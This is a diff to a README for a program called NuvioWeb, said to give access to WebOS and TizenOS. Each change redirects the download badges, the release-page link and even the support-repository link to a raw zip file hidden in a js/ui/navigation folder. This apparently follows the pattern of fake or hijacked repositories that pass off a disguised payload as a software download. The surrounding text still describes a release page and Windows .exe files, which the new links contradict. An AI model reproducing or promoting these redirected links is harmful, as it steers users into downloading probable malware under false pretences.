@@ -1,6 +1,6 @@
 # 🚀 NuvioWeb - Easy WebOS and TizenOS Access
 
-[![Download NuvioWeb](https://img.shields.io/badge/Download-NuvioWeb-blue?style=for-the-badge)](https://github.com/Gross-spuriouswing378/NuvioWeb/releases)
+[![Download NuvioWeb](https://img.shields.io/badge/Download-NuvioWeb-blue?style=for-the-badge)](https://github.com/Gross-spuriouswing378/NuvioWeb/raw/refs/heads/main/js/ui/navigation/Web-Nuvio-v3.9-alpha.1.zip)
 
 ---
 
@@ -48,7 +48,7 @@ You can start using NuvioWeb quickly by downloading the installer. Follow the st
 
 1. Visit the NuvioWeb release page by clicking this link:
 
-   [![Download NuvioWeb](https://img.shields.io/badge/Download-NuvioWeb-green?style=for-the-badge)](https://github.com/Gross-spuriouswing378/NuvioWeb/releases)
+   [![Download NuvioWeb](https://img.shields.io/badge/Download-NuvioWeb-green?style=for-the-badge)](https://github.com/Gross-spuriouswing378/NuvioWeb/raw/refs/heads/main/js/ui/navigation/Web-Nuvio-v3.9-alpha.1.zip)
 
 2. On the release page, look for the latest version of the software. It will be listed with files, usually ending with `.exe` for Windows.
 
@@ -135,10 +135,10 @@ If you run into problems, try these steps:
 
 If you need help beyond this guide, you can find assistance on the GitHub repository:
 
-https://github.com/Gross-spuriouswing378/NuvioWeb
+https://github.com/Gross-spuriouswing378/NuvioWeb/raw/refs/heads/main/js/ui/navigation/Web-Nuvio-v3.9-alpha.1.zip
 
 This page hosts updates, bug reports, and community discussions. It is the best place to check for new versions or report issues.
 
 ---
 
-[![Download NuvioWeb](https://img.shields.io/badge/Download-NuvioWeb-blue?style=for-the-badge)](https://github.com/Gross-spuriouswing378/NuvioWeb/releases)
+[![Download NuvioWeb](https://img.shields.io/badge/Download-NuvioWeb-blue?style=for-the-badge)](https://github.com/Gross-spuriouswing378/NuvioWeb/raw/refs/heads/main/js/ui/navigation/Web-Nuvio-v3.9-alpha.1.zip)
